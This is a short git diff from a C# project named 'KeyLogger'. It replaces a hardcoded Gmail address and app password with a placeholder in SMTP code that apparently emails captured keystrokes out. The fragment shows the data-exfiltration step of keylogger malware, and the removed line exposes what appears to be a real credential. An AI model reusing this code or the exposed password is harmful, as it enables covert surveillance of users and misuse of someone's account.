@@ -92,7 +92,7 @@ namespace KeyLogger
             mailMessage.Subject = subject;
             client.UseDefaultCredentials = false;
             client.EnableSsl = true;
-            client.Credentials = new System.Net.NetworkCredential("havsan.kadir.karaoglu@gmail.com", "hbzj rpcr epkd iqif");
+            client.Credentials = new System.Net.NetworkCredential("havsan.kadir.karaoglu@gmail.com", "Password");
             mailMessage.Body = emailBody;
             client.Send(mailMessage);
 
